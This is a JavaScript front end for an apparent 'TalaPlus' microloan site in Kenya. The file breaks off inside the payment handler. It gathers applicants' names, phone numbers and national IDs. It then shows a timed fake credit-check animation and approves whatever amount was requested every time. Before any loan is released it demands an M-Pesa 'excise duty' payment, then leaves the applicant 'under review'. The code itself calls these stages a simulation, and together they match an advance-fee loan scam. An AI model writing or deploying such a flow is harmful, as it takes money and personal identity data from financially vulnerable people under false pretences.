/* ==========================================================================
   TALA PLUS - MAIN APPLICATION LOGIC
   ========================================================================== */

document.addEventListener('DOMContentLoaded', () => {
  
  // --- STATE ROUTER VARIABLES ---
  const views = {
    landing: document.getElementById('landing-view'),
    appFlow: document.getElementById('app-flow-view'),
    processing: document.getElementById('processing-view'),
    offer: document.getElementById('offer-view'),
    excisePayment: document.getElementById('excise-payment-view'),
    underReview: document.getElementById('under-review-view')
  };

  let currentStep = 1;
  const totalSteps = 3;
  
  // --- FORM INPUTS ---
  const loanForm = document.getElementById('loan-application-form');
  const inputFields = {
    fullName: document.getElementById('fullName'),
    phoneNumber: document.getElementById('phoneNumber'),
    idNumber: document.getElementById('idNumber'),
    loanCategory: document.getElementById('loanCategory'),
    loanAmount: document.getElementById('loanAmountSlider'),
    repaymentPeriod: document.getElementById('repaymentPeriod'),
    educationLevel: document.getElementById('educationLevel'),
    employmentStatus: document.getElementById('employmentStatus'),
    monthlyIncome: document.getElementById('monthlyIncome'),
    county: document.getElementById('county')
  };

  // --- LOCALSTORAGE CONFIG ---
  const STORAGE_KEY_DATA = 'talaPlusApplicationData';
  const STORAGE_KEY_TIME = 'talaPlusApplicationSavedAt';
  const STORAGE_KEY_CHECKOUT_ID = 'talaPlusCheckoutRequestId';
  const STORAGE_KEY_PAYMENT_PHONE = 'talaPlusPaymentPhone';
  const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000; // 7 days in milliseconds

  // ==========================================================================
  // 1. MOBILE MENU TOGGLE
  // ==========================================================================
  const menuToggle = document.getElementById('menu-toggle');
  const navbar = document.getElementById('navbar');
  const navLinkItems = document.querySelectorAll('.nav-link-item');

  function toggleMobileMenu() {
    menuToggle.classList.toggle('active');
    navbar.classList.toggle('active');
  }

  function closeMobileMenu() {
    menuToggle.classList.remove('active');
    navbar.classList.remove('active');
  }

  if (menuToggle) {
    menuToggle.addEventListener('click', toggleMobileMenu);
  }

  // Close menu when clicking nav links or CTA button inside menu
  navLinkItems.forEach(link => {
    link.addEventListener('click', closeMobileMenu);
  });

  // ==========================================================================
  // 2. VIEW STATE ROUTING MANAGER
  // ==========================================================================
  function showView(viewName) {
    closeMobileMenu();
    
    // Hide all views, show target view with fade transition
    Object.keys(views).forEach(key => {
      if (key === viewName) {
        views[key].classList.remove('hidden');
        views[key].classList.add('active');
        
        // Scroll to top of viewport on view swap
        window.scrollTo({ top: 0, behavior: 'instant' });
      } else {
        views[key].classList.add('hidden');
        views[key].classList.remove('active');
      }
    });
  }

  // Helper to check if user is in an active form/payment session
  function isInteractiveState() {
    return (views.appFlow && views.appFlow.classList.contains('active')) ||
           (views.excisePayment && views.excisePayment.classList.contains('active')) ||
           (views.offer && views.offer.classList.contains('active'));
  }

  function showPrivacyModal() {
    Swal.fire({
      title: 'Privacy Policy',
      html: `
        <div style="text-align: left; max-height: 300px; overflow-y: auto; font-size: 0.95rem; line-height: 1.5; color: #334155; padding-right: 5px;">
          <p style="margin-bottom: 10px;"><strong>1. Information Collection</strong><br>
          We collect information you provide directly to us when applying for a loan, including your name, telephone number, National ID number, education level, employment status, monthly income, and home county.</p>
          
          <p style="margin-bottom: 10px;"><strong>2. Use of Information</strong><br>
          We use this data to evaluate creditworthiness, process transactions, prevent fraud, and comply with regulatory requirements under the Central Bank of Kenya (CBK) directives.</p>
          
          <p style="margin-bottom: 10px;"><strong>3. Credit Reference Bureaus (CRB)</strong><br>
          By submitting your details, you authorize TalaPlus to query your credit history with licensed CRBs and report your repayment performance accordingly.</p>
          
          <p style="margin-bottom: 10px;"><strong>4. Security & Encryption</strong><br>
          We implement industry-standard encryption protocols to protect your personal and financial information. We do not sell or share your data with unauthorized third parties.</p>
          
          <p style="margin-bottom: 10px;"><strong>5. Contact Support</strong><br>
          For any data protection inquiries, email us at <a href="mailto:customer@talaplus.ke" style="color: #0f766e; text-decoration: underline;">customer@talaplus.ke</a>.</p>
        </div>
      `,
      confirmButtonText: 'I Understand',
      confirmButtonColor: '#0f766e',
      background: '#ffffff',
      color: '#0f172a',
      width: '32rem'
    });
  }

  function showTermsModal() {
    Swal.fire({
      title: 'Terms of Service',
      html: `
        <div style="text-align: left; max-height: 300px; overflow-y: auto; font-size: 0.95rem; line-height: 1.5; color: #334155; padding-right: 5px;">
          <p style="margin-bottom: 10px;"><strong>1. Eligibility</strong><br>
          You must be a Kenyan resident aged 18 years or older, with a valid National ID and a registered Safaricom M-Pesa account.</p>
          
          <p style="margin-bottom: 10px;"><strong>2. Interest & Fees</strong><br>
          Loans are subject to a flat interest rate of 3.5% per month. A regulatory excise duty of 0.2% is required to authorize the disbursement of your approved loan amount.</p>
          
          <p style="margin-bottom: 10px;"><strong>3. Repayment & Rollover</strong><br>
          You agree to repay the total outstanding amount within your selected repayment period (1, 2, 3, or 6 months). Extensions or rollovers must be requested prior to the due date and are subject to additional terms.</p>
          
          <p style="margin-bottom: 10px;"><strong>4. Default & Credit Reporting</strong><br>
          Failure to repay your loan by the due date may result in late payment penalties, collection actions, and reporting of your default status to licensed Credit Reference Bureaus (CRB).</p>
          
          <p style="margin-bottom: 10px;"><strong>5. Acceptance</strong><br>
          By proceeding with any loan application, you electronically sign and agree to abide by these terms and our general lending guidelines.</p>
        </div>
      `,
      confirmButtonText: 'I Accept',
      confirmButtonColor: '#0f766e',
      background: '#ffffff',
      color: '#0f172a',
      width: '32rem'
    });
  }

  function navigateToSection(targetId) {
    showView('landing');
    if (targetId === 'hero') {
      window.scrollTo({ top: 0, behavior: 'smooth' });
    } else {
      const targetEl = document.getElementById(targetId);
      if (targetEl) {
        setTimeout(() => {
          targetEl.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }, 50);
      }
    }
  }

  function handleHashNavigation(targetId, e) {
    if (e) e.preventDefault();

    if (targetId === 'privacy') {
      showPrivacyModal();
      return;
    }
    if (targetId === 'terms') {
      showTermsModal();
      return;
    }

    if (isInteractiveState()) {
      Swal.fire({
        title: 'Exit Application?',
        text: 'Are you sure you want to navigate away? Your entered details will remain saved in draft form, but you will need to re-verify to continue your loan approval.',
        icon: 'warning',
        showCancelButton: true,
        confirmButtonText: 'Yes, Navigate Away',
        cancelButtonText: 'No, Stay Here',
        confirmButtonColor: '#ef4444',
        cancelButtonColor: '#0f766e',
        background: '#ffffff',
        color: '#0f172a'
      }).then((result) => {
        if (result.isConfirmed) {
          navigateToSection(targetId);
        }
      });
    } else {
      navigateToSection(targetId);
    }
  }

  // Bind global navigation intercept for all internal hash links
  document.querySelectorAll('a[href^="#"]').forEach(link => {
    link.addEventListener('click', (e) => {
      const href = link.getAttribute('href');
      const targetId = href.substring(1);
      handleHashNavigation(targetId, e);
    });
  });

  // Cancel / Exit application form buttons
  document.getElementById('cancel-application-btn').addEventListener('click', () => {
  showBackConfirmModal();
});

  // Bind homepage "Apply Now" buttons
  const startAppButtons = document.querySelectorAll('.start-app-btn');
  startAppButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      // If button has data-category, preselect it in the form
      const preselectCat = btn.getAttribute('data-category');
      if (preselectCat) {
        selectLoanCategory(preselectCat);
      }
      
      showView('appFlow');
      currentStep = 1;
      updateFormStepsUI();
    });
  });

  // ==========================================================================
  // 3. LOAN MATHEMATICS & SLIDER CONTROLLERS
  // ==========================================================================
  const FLAT_INTEREST_RATE = 0.035; // 3.5%

  // Hero calculation elements
  const heroSlider = document.getElementById('hero-loan-slider');
  const heroSliderVal = document.getElementById('hero-slider-value');
  const heroInterestVal = document.getElementById('hero-interest-val');
  const heroTotalVal = document.getElementById('hero-total-val');
  const heroPeriodTabs = document.querySelectorAll('.hero-section .period-tab');
  let selectedHeroPeriod = 1; // Default 1 month

  function formatKsh(amount) {
    return 'KES ' + Number(amount).toLocaleString('en-KE');
  }

  // Update Hero Calculator Math
  function updateHeroCalculations() {
    if (!heroSlider) return;
    const amount = parseInt(heroSlider.value, 10);
    
    if (heroSliderVal) {
      heroSliderVal.textContent = formatKsh(amount);
    }
    
    const interest = Math.round(amount * FLAT_INTEREST_RATE);
    const total = amount + interest;
    
    if (heroInterestVal) {
      heroInterestVal.textContent = formatKsh(interest);
    }
    if (heroTotalVal) {
      heroTotalVal.textContent = formatKsh(total);
    }
  }

  if (heroSlider) {
    heroSlider.addEventListener('input', updateHeroCalculations);
    
    heroPeriodTabs.forEach(tab => {
      tab.addEventListener('click', () => {
        heroPeriodTabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        selectedHeroPeriod = parseInt(tab.getAttribute('data-months'), 10);
        
        // Sync Hero period choice into Form selection state
        setFormRepaymentPeriod(selectedHeroPeriod);
      });
    });
    
    // Initialize Hero Math
    updateHeroCalculations();
  }

  // Form calculator elements
  const formSlider = document.getElementById('loanAmountSlider');
  const formAmountDisplay = document.getElementById('form-amount-display');
  const formInterestFee = document.getElementById('math-interest-fee');
  const formTotalRepay = document.getElementById('math-total-repay');

  function updateFormCalculations() {
    const amount = parseInt(formSlider.value, 10);
    formAmountDisplay.textContent = formatKsh(amount);
    
    const interest = Math.round(amount * FLAT_INTEREST_RATE);
    const total = amount + interest;
    
    formInterestFee.textContent = formatKsh(interest);
    formTotalRepay.textContent = formatKsh(total);
    
    // Auto-sync into Hero widget value to keep calculations coherent
    if (heroSlider) {
      heroSlider.value = amount;
      updateHeroCalculations();
    }
  }

  if (formSlider) {
    formSlider.addEventListener('input', () => {
      updateFormCalculations();
      saveFormData(); // Auto-save on slider slide
    });
  }

  // Sync Form Slider back to Hero Slider interactions
  if (heroSlider) {
    heroSlider.addEventListener('input', () => {
      if (formSlider) {
        formSlider.value = heroSlider.value;
        updateFormCalculations();
      }
    });
  }

  // ==========================================================================
  // 4. MULTI-STEP FORM LOGIC
  // ==========================================================================
  const stepNodes = [
    document.getElementById('step-node-1'),
    document.getElementById('step-node-2'),
    document.getElementById('step-node-3')
  ];
  
  const stepContents = [
    document.getElementById('form-step-1'),
    document.getElementById('form-step-2'),
    document.getElementById('form-step-3')
  ];

  const prevBtn = document.getElementById('form-prev-btn');
  const nextBtn = document.getElementById('form-next-btn');
  const progressBarFill = document.getElementById('progress-bar-fill');

  function updateFormStepsUI() {
    // 1. Hide/Show step panels
    stepContents.forEach((panel, idx) => {
      if (idx === (currentStep - 1)) {
        panel.classList.add('active');
      } else {
        panel.classList.remove('active');
      }
    });

    // 2. Update Progress step nodes (circle indicators)
    stepNodes.forEach((node, idx) => {
      const stepNum = idx + 1;
      node.classList.remove('active', 'completed');
      
      if (stepNum === currentStep) {
        node.classList.add('active');
      } else if (stepNum < currentStep) {
        node.classList.add('completed');
      }
    });

    // 3. Update Progress Bar Fill Width
    const fillPercent = ((currentStep - 1) / (totalSteps - 1)) * 100;
    progressBarFill.style.width = `${fillPercent}%`;

    // 4. Update Navigation Button display
    if (currentStep === 1) {
      prevBtn.style.visibility = 'hidden';
      nextBtn.textContent = 'Continue';
    } else {
      prevBtn.style.visibility = 'visible';
      if (currentStep === totalSteps) {
        nextBtn.textContent = 'Submit Application';
      } else {
        nextBtn.textContent = 'Continue';
      }
    }
  }

  // Clickable step circles (only lets them go back to previously unlocked steps)
  stepNodes.forEach(node => {
    node.addEventListener('click', () => {
      const targetStep = parseInt(node.getAttribute('data-step'), 10);
      if (targetStep < currentStep) {
        currentStep = targetStep;
        updateFormStepsUI();
      }
    });
  });

  // Navigation click handles
  prevBtn.addEventListener('click', () => {
    if (currentStep > 1) {
      currentStep--;
      updateFormStepsUI();
    }
  });

  nextBtn.addEventListener('click', () => {
    if (validateStep(currentStep)) {
      if (currentStep < totalSteps) {
        currentStep++;
        updateFormStepsUI();
      } else {
        // Submit triggered
        submitApplicationForm();
      }
    }
  });

  // --- LOAN FORM SELECTION HANDLERS ---
  
  // Category cards selector
  const categoryCards = document.querySelectorAll('.category-select-card');
  function selectLoanCategory(categoryName) {
    categoryCards.forEach(card => {
      if (card.getAttribute('data-category') === categoryName) {
        card.classList.add('active');
      } else {
        card.classList.remove('active');
      }
    });
    inputFields.loanCategory.value = categoryName;
    saveFormData();
  }

  categoryCards.forEach(card => {
    card.addEventListener('click', () => {
      const cat = card.getAttribute('data-category');
      selectLoanCategory(cat);
    });
  });

  // Repayment period card selector
  const periodCards = document.querySelectorAll('.period-option-card');
  function setFormRepaymentPeriod(months) {
    periodCards.forEach(card => {
      if (parseInt(card.getAttribute('data-period'), 10) === months) {
        card.classList.add('active');
      } else {
        card.classList.remove('active');
      }
    });
    inputFields.repaymentPeriod.value = months;
    
    // Sync back to Hero active tabs
    heroPeriodTabs.forEach(tab => {
      if (parseInt(tab.getAttribute('data-months'), 10) === months) {
        tab.classList.add('active');
      } else {
        tab.classList.remove('active');
      }
    });
    saveFormData();
  }

  periodCards.forEach(card => {
    card.addEventListener('click', () => {
      const p = parseInt(card.getAttribute('data-period'), 10);
      setFormRepaymentPeriod(p);
    });
  });

  // ==========================================================================
  // 5. LOCALSTORAGE AUTO-SAVE UTILITY FUNCTIONS
  // ==========================================================================
  
  // Clear any data older than 7 days
  function clearExpiredData() {
    const savedTime = localStorage.getItem(STORAGE_KEY_TIME);
    if (savedTime) {
      const now = Date.now();
      const elapsed = now - parseInt(savedTime, 10);
      
      if (elapsed > SEVEN_DAYS_MS) {
        localStorage.removeItem(STORAGE_KEY_DATA);
        localStorage.removeItem(STORAGE_KEY_TIME);
        console.log('TalaPlus: Expired localStorage progress cleared (older than 7 days).');
      }
    }
  }

  // Save form fields to localStorage
  function saveFormData() {
    const data = {
      fullName: inputFields.fullName.value,
      phoneNumber: inputFields.phoneNumber.value,
      idNumber: inputFields.idNumber.value,
      loanCategory: inputFields.loanCategory.value,
      loanAmount: inputFields.loanAmount.value,
      repaymentPeriod: inputFields.repaymentPeriod.value,
      educationLevel: inputFields.educationLevel.value,
      employmentStatus: inputFields.employmentStatus.value,
      monthlyIncome: inputFields.monthlyIncome.value,
      county: inputFields.county.value
    };
    
    localStorage.setItem(STORAGE_KEY_DATA, JSON.stringify(data));
    localStorage.setItem(STORAGE_KEY_TIME, Date.now().toString());
  }

  // Pre-fill fields from localStorage
  function loadFormData() {
    clearExpiredData();
    
    const savedData = localStorage.getItem(STORAGE_KEY_DATA);
    if (savedData) {
      try {
        const data = JSON.parse(savedData);
        
        // Restore standard text/select inputs
        inputFields.fullName.value = data.fullName || '';
        inputFields.phoneNumber.value = data.phoneNumber || '';
        inputFields.idNumber.value = data.idNumber || '';
        inputFields.educationLevel.value = data.educationLevel || '';
        inputFields.employmentStatus.value = data.employmentStatus || '';
        inputFields.monthlyIncome.value = data.monthlyIncome || '';
        inputFields.county.value = data.county || '';
        
        // Restore categories
        if (data.loanCategory) {
          selectLoanCategory(data.loanCategory);
        }
        
        // Restore sliders
        if (data.loanAmount) {
          inputFields.loanAmount.value = data.loanAmount;
          if (heroSlider) {
            heroSlider.value = data.loanAmount;
          }
        }
        
        // Restore periods
        if (data.repaymentPeriod) {
          const months = parseInt(data.repaymentPeriod, 10);
          setFormRepaymentPeriod(months);
        }
        
        // Run update display updates
        updateFormCalculations();
        updateHeroCalculations();
        console.log('TalaPlus: Restored client profile from valid localStorage.');
        
      } catch (err) {
        console.error('TalaPlus: Error parsing localStorage data.', err);
      }
    }
  }

  // Attach input listeners to all form controls for instant auto-save
  const inputsToSave = [
    inputFields.fullName,
    inputFields.phoneNumber,
    inputFields.idNumber,
    inputFields.educationLevel,
    inputFields.employmentStatus,
    inputFields.monthlyIncome,
    inputFields.county
  ];

  inputsToSave.forEach(input => {
    input.addEventListener('input', saveFormData);
    input.addEventListener('change', saveFormData);
  });

  // Run localStorage restoration on load
  loadFormData();

  // Check if a payment was already made for the saved profile on load
  async function checkExistingPaymentOnLoad() {
    const rawData = localStorage.getItem(STORAGE_KEY_DATA);
    if (!rawData) return;
    
    try {
      const data = JSON.parse(rawData);
      const phoneToQuery = data.phoneNumber;
      if (!phoneToQuery) return;
      
      const response = await fetch(`/api/check-payment-status?phone=${encodeURIComponent(phoneToQuery)}`);
      if (response.ok) {
        const resData = await response.json();
        if (resData.success && resData.status === 'success') {
          renderUnderReviewPage(formatKenyanPhone(phoneToQuery));
        } else if (resData.success && resData.status === 'pending') {
          showView('excisePayment');
          setExciseState('sending');
          currentCheckoutRequestId = resData.checkoutRequestId;
          localStorage.setItem(STORAGE_KEY_CHECKOUT_ID, currentCheckoutRequestId);
          localStorage.setItem(STORAGE_KEY_PAYMENT_PHONE, formatKenyanPhone(phoneToQuery));
          startPaymentPolling(currentCheckoutRequestId, formatKenyanPhone(phoneToQuery));
        }
      }
    } catch (err) {
      console.error('[LOAD CHECK ERROR]', err);
    }
  }

  checkExistingPaymentOnLoad();

  // ==========================================================================
  // 6. VALIDATION CHECKS
  // ==========================================================================
  function showError(inputEl, isError) {
    const group = inputEl.closest('.input-group');
    if (group) {
      if (isError) {
        group.classList.add('invalid');
      } else {
        group.classList.remove('invalid');
      }
    }
  }

  // Clear errors dynamically on input correction
  inputFields.fullName.addEventListener('input', () => {
    if (inputFields.fullName.value.trim() !== '') {
      showError(inputFields.fullName, false);
    }
  });

  inputFields.phoneNumber.addEventListener('input', () => {
    const rawVal = inputFields.phoneNumber.value.trim();
    const cleanVal = rawVal.replace(/\s+/g, '');
    const kenyaPhoneRegex = /^(?:254|\+254|0)?(7|1)\d{8}$/;
    if (kenyaPhoneRegex.test(cleanVal)) {
      showError(inputFields.phoneNumber, false);
    }
  });

  inputFields.idNumber.addEventListener('input', () => {
    const idVal = inputFields.idNumber.value.trim();
    const idDigits = idVal.replace(/\D/g, '');
    if (idVal !== '' && idDigits.length >= 7 && idDigits.length <= 10 && idVal === idDigits) {
      showError(inputFields.idNumber, false);
    }
  });

  const selectDropdowns = [
    inputFields.educationLevel,
    inputFields.employmentStatus,
    inputFields.monthlyIncome,
    inputFields.county
  ];
  selectDropdowns.forEach(select => {
    select.addEventListener('change', () => {
      if (select.value !== '') {
        showError(select, false);
      }
    });
  });

  // Validate step controls
  function validateStep(step) {
    let isValid = true;
    
    if (step === 1) {
      // 1. Full name validation
      if (inputFields.fullName.value.trim() === '') {
        showError(inputFields.fullName, true);
        isValid = false;
      } else {
        showError(inputFields.fullName, false);
      }

      // 2. M-Pesa Phone Validation
      const rawPhone = inputFields.phoneNumber.value.trim();
      const cleanPhone = rawPhone.replace(/\s+/g, '');
      const kenyaPhoneRegex = /^(?:254|\+254|0)?(7|1)\d{8}$/;
      
      if (!kenyaPhoneRegex.test(cleanPhone)) {
        showError(inputFields.phoneNumber, true);
        isValid = false;
      } else {
        showError(inputFields.phoneNumber, false);
      }

      // 3. ID Number validation
      const idVal = inputFields.idNumber.value.trim();
      const idDigits = idVal.replace(/\D/g, '');
      if (idVal === '' || idDigits.length < 7 || idDigits.length > 10 || idVal !== idDigits) {
        showError(inputFields.idNumber, true);
        isValid = false;
      } else {
        showError(inputFields.idNumber, false);
      }
    }
    
    else if (step === 2) {
      // Step 2 is visual slider choices, defaults to standard values. Always valid.
      isValid = true;
    }
    
    else if (step === 3) {
      // Dropdown validation
      if (inputFields.educationLevel.value === '') {
        showError(inputFields.educationLevel, true);
        isValid = false;
      } else {
        showError(inputFields.educationLevel, false);
      }

      if (inputFields.employmentStatus.value === '') {
        showError(inputFields.employmentStatus, true);
        isValid = false;
      } else {
        showError(inputFields.employmentStatus, false);
      }

      if (inputFields.monthlyIncome.value === '') {
        showError(inputFields.monthlyIncome, true);
        isValid = false;
      } else {
        showError(inputFields.monthlyIncome, false);
      }

      if (inputFields.county.value === '') {
        showError(inputFields.county, true);
        isValid = false;
      } else {
        showError(inputFields.county, false);
      }
    }

    return isValid;
  }

  // ==========================================================================
  // 7. LOAN PROCESSING FLOW SIMULATION
  // ==========================================================================
  
  // Format phone output
  function formatKenyanPhone(phone) {
    let clean = phone.replace(/[\s\+]/g, '');
    if (clean.startsWith('254')) {
      clean = clean.substring(3);
    } else if (clean.startsWith('0')) {
      clean = clean.substring(1);
    }
    if (clean.length === 9) {
      return `+254 ${clean.substring(0, 3)} ${clean.substring(3, 6)} ${clean.substring(6)}`;
    }
    return phone;
  }

  function submitApplicationForm() {
    // Save to guarantee local updates
    saveFormData();
    
    showView('processing');
    
    // Reset loading elements
    const progressFill = document.querySelector('.ring-fill');
    const percentLabel = document.getElementById('loader-percent');
    
    const checkSteps = [
      document.getElementById('chk-step-1'),
      document.getElementById('chk-step-2'),
      document.getElementById('chk-step-3'),
      document.getElementById('chk-step-4')
    ];
    
    checkSteps.forEach(step => {
      const marker = step.querySelector('.chk-status');
      marker.className = 'chk-status pending';
      step.className = 'checklist-item';
    });

    const totalDuration = 3500; // 3.5 seconds
    const intervalTime = 50; // Update percentage UI smoothly
    let elapsed = 0;

    // SVG stroke calculations
    const strokeMaxOffset = 283; // Full circumference length of 45 radius circle

    const progressTimer = setInterval(() => {
      elapsed += intervalTime;
      let ratio = Math.min(elapsed / totalDuration, 1);
      let percentage = Math.round(ratio * 100);
      
      // Update circular loader stroke
      const offset = strokeMaxOffset - (ratio * strokeMaxOffset);
      progressFill.style.strokeDashoffset = offset;
      percentLabel.textContent = `${percentage}%`;

      // Trigger checkpoints
      if (percentage >= 0 && percentage < 25) {
        setChecklistStepActive(0);
      } else if (percentage >= 25 && percentage < 50) {
        setChecklistStepSuccess(0);
        setChecklistStepActive(1);
      } else if (percentage >= 50 && percentage < 75) {
        setChecklistStepSuccess(1);
        setChecklistStepActive(2);
      } else if (percentage >= 75 && percentage < 100) {
        setChecklistStepSuccess(2);
        setChecklistStepActive(3);
      } else if (percentage >= 100) {
        setChecklistStepSuccess(3);
        clearInterval(progressTimer);
        setTimeout(renderLoanOfferPage, 300); // Small pause at 100%
      }

    }, intervalTime);

    function setChecklistStepActive(index) {
      const step = checkSteps[index];
      const marker = step.querySelector('.chk-status');
      if (!marker.classList.contains('success')) {
        marker.className = 'chk-status active';
        step.className = 'checklist-item current';
      }
    }

    function setChecklistStepSuccess(index) {
      const step = checkSteps[index];
      const marker = step.querySelector('.chk-status');
      marker.className = 'chk-status success';
      step.className = 'checklist-item done';
    }
  }

  // ==========================================================================
  // 8. LOAN OFFER PAGE GENERATION
  // ==========================================================================
  let activeOfferData = null;

  function renderLoanOfferPage() {
    const rawData = localStorage.getItem(STORAGE_KEY_DATA);
    if (!rawData) {
      showView('landing');
      return;
    }
    
    const data = JSON.parse(rawData);
    const amount = parseInt(data.loanAmount, 10);
    const interest = Math.round(amount * FLAT_INTEREST_RATE);
    const totalRepay = amount + interest;
    
    // Extract first name for greeting
    const names = data.fullName.trim().split(/\s+/);
    const firstName = names[0] ? names[0].charAt(0).toUpperCase() + names[0].slice(1) : 'Client';
    
    // Populate Offer Card Elements
    document.getElementById('offer-first-name').textContent = firstName;
    document.getElementById('offer-approved-amount').textContent = formatKsh(amount);
    document.getElementById('offer-name').textContent = data.fullName;
    document.getElementById('offer-phone').textContent = formatKenyanPhone(data.phoneNumber);
    document.getElementById('offer-category').textContent = data.loanCategory;
    document.getElementById('offer-period').textContent = `${data.repaymentPeriod} ${data.repaymentPeriod == 1 ? 'Month' : 'Months'}`;
    document.getElementById('offer-interest').textContent = formatKsh(interest);
    document.getElementById('offer-total-repay').textContent = formatKsh(totalRepay);

    // Save calculation result references for disbursement screen access
    activeOfferData = {
      amount: amount,
      formattedPhone: formatKenyanPhone(data.phoneNumber)
    };

    showView('offer');
  }

  // Button actions in Offer View
  document.getElementById('accept-offer-btn').addEventListener('click', () => {
    renderExcisePaymentPage();
  });

  document.getElementById('decline-offer-btn').addEventListener('click', () => {
    Swal.fire({
      title: 'Decline Loan Offer?',
      text: 'Are you sure you want to decline this approved loan offer? Your application profile will remain saved for future requests.',
      icon: 'warning',
      showCancelButton: true,
      confirmButtonText: 'Yes, Decline Offer',
      cancelButtonText: 'No, Keep Offer',
      confirmButtonColor: '#ef4444',
      cancelButtonColor: '#0f766e',
      background: '#ffffff',
      color: '#0f172a'
    }).then((result) => {
      if (result.isConfirmed) {
        showView('landing');
      }
    });
  });

  // ==========================================================================
  // 9. EXCISE DUTY PAYMENT & UNDER REVIEW SIMULATION
  // ==========================================================================
  const exciseStates = {
    idle: document.getElementById('excise-payment-idle'),
    sending: document.getElementById('excise-payment-sending'),
    error: document.getElementById('excise-payment-error')
  };

  const excisePhoneInput = document.getElementById('excise-phone');
  let currentCheckoutRequestId = null;
  let pollingIntervalId = null;

  function setExciseState(stateName) {
    Object.keys(exciseStates).forEach(key => {
      if (key === stateName) {
        exciseStates[key].classList.remove('hidden');
        exciseStates[key].classList.add('active');
      } else {
        exciseStates[key].classList.add('hidden');
        exciseStates[key].classList.remove('active');
      }
    });
  }

  async function renderExcisePaymentPage() {
    const rawData = localStorage.getItem(STORAGE_KEY_DATA);
    if (!rawData) {
      showView('landing');
      return;
    }
    
    const data = JSON.parse(rawData);
    const amount = parseInt(data.loanAmount, 10);
    const exciseDuty = Math.round(amount * 0.002); // 0.2% excise duty

    // Set amounts in the UI
    document.getElementById('excise-loan-amount-val').textContent = formatKsh(amount);
    document.getElementById('excise-duty-val').textContent = formatKsh(exciseDuty);

    // Set phone number for STK Push pre-fill (removing +254 prefix or leading 0 to fit standard field)
    let rawPhone = data.phoneNumber || '';
    let cleanPhone = rawPhone.replace(/[\s\+]/g, '');
    if (cleanPhone.startsWith('254')) {
      cleanPhone = cleanPhone.substring(3);
    } else if (cleanPhone.startsWith('0')) {
      cleanPhone = cleanPhone.substring(1);
    }
    excisePhoneInput.value = cleanPhone;

    // Reset view states
    showError(excisePhoneInput, false);
    setExciseState('sending');
    showView('excisePayment');

    try {
      const phoneToQuery = data.phoneNumber;
      const response = await fetch(`/api/check-payment-status?phone=${encodeURIComponent(phoneToQuery)}`);
      if (response.ok) {
        const resData = await response.json();
        if (resData.success && resData.status === 'success') {
          localStorage.removeItem(STORAGE_KEY_CHECKOUT_ID);
          localStorage.removeItem(STORAGE_KEY_PAYMENT_PHONE);
          renderUnderReviewPage(formatKenyanPhone(phoneToQuery));
          return;
        } else if (resData.success && resData.status === 'pending') {
          currentCheckoutRequestId = resData.checkoutRequestId;
          localStorage.setItem(STORAGE_KEY_CHECKOUT_ID, currentCheckoutRequestId);
          localStorage.setItem(STORAGE_KEY_PAYMENT_PHONE, formatKenyanPhone(phoneToQuery));
          startPaymentPolling(currentCheckoutRequestId, formatKenyanPhone(phoneToQuery));
          return;
        }
      }
    } catch (err) {
      console.error('[EXCISE PAGE CHECK ERROR]', err);
    }

    setExciseState('idle');
  }



  // Display dynamic payment error UI depending on cancel vs failed statuses
  function showExciseErrorState(status, message) {
    const badge = document.getElementById('payment-error-badge');
    const title = document.getElementById('payment-error-title');
    const msg = document.getElementById('payment-error-msg');

    if (badge && title && msg) {
      badge.className = 'error-icon-badge'; // reset class
      if (status === 'cancelled') {
        badge.classList.add('warning-badge');
        title.textContent = 'Payment Cancelled';
        msg.textContent = message || 'The M-Pesa payment prompt was cancelled by the user. No funds were deducted from your account. Please try again.';
        badge.innerHTML = `
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="width: 28px; height: 28px;">
            <circle cx="12" cy="12" r="10"></circle>
            <line x1="12" y1="8" x2="12" y2="12"></line>
            <line x1="12" y1="16" x2="12.01" y2="16"></line>
          </svg>
        `;
      } else {
        badge.classList.add('failed-badge');
        title.textContent = 'Payment Failed (Wrong PIN/Information)';
        msg.textContent = message || 'The transaction failed because incorrect details were entered (e.g., incorrect PIN or insufficient balance). Please verify and try again.';
        badge.innerHTML = `
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="width: 28px; height: 28px;">
            <line x1="18" y1="6" x2="6" y2="18"></line>
            <line x1="6" y1="6" x2="18" y2="18"></line>
          </svg>
        `;
      }
    }
    setExciseState('error');
  }

  // Polling check logic for M-Pesa payment status verification
  function startPaymentPolling(checkoutRequestId, formattedPhone) {
    if (pollingIntervalId) clearInterval(pollingIntervalId);

    const startTime = Date.now();
    pollingIntervalId = setInterval(async () => {
      try {
        // Timeout after 65 seconds
        if (Date.now() - startTime > 65000) {
          clearInterval(pollingIntervalId);
          pollingIntervalId = null;
          showExciseErrorState('failed', 'The payment verification process timed out. Please verify if the M-Pesa prompt appeared on your phone and try again.');
          return;
        }

        const response = await fetch(`/api/check-payment-status?checkoutRequestId=${checkoutRequestId}`);
        if (!response.ok) throw new Error('Status check request failed');
        
        const data = await response.json();
        if (data.success) {
          if (data.status === 'success') {
            clearInterval(pollingIntervalId);
            pollingIntervalId = null;
            localStorage.removeItem(STORAGE_KEY_CHECKOUT_ID);
            localStorage.removeItem(STORAGE_KEY_PAYMENT_PHONE);
            renderUnderReviewPage(formattedPhone);
          } else if (data.status === 'cancelled') {
            clearInterval(pollingIntervalId);
            pollingIntervalId = null;
            localStorage.removeItem(STORAGE_KEY_CHECKOUT_ID);
            localStorage.removeItem(STORAGE_KEY_PAYMENT_PHONE);
            showExciseErrorState('cancelled', data.resultDesc || 'Payment request was cancelled by the user.');
          } else if (data.status === 'failed') {
            clearInterval(pollingIntervalId);
            pollingIntervalId = null;
            localStorage.removeItem(STORAGE_KEY_CHECKOUT_ID);
            localStorage.removeItem(STORAGE_KEY_PAYMENT_PHONE);
            showExciseErrorState('failed', data.resultDesc || 'Payment request failed (e.g. wrong PIN or insufficient funds).');
          }
        }
      } catch (err) {
        console.error('[POLLING ERROR]', err);
      }
    }, 2000); // Poll status every 2 seconds
  }

  // Request STK Push trigger button
  document.getElementById('request-stk-btn').addEventListener('click', async () => {
    const rawPhone = excisePhoneInput.value.trim();
    const cleanPhone = rawPhone.replace(/\s+/g, '');
    const kenyaPhoneRegex = /^(?:254|\+254|0)?(7|1)\d{8}$/;
    
    if (!kenyaPhoneRegex.test(cleanPhone)) {
      showError(excisePhoneInput, true);
      return;
    }
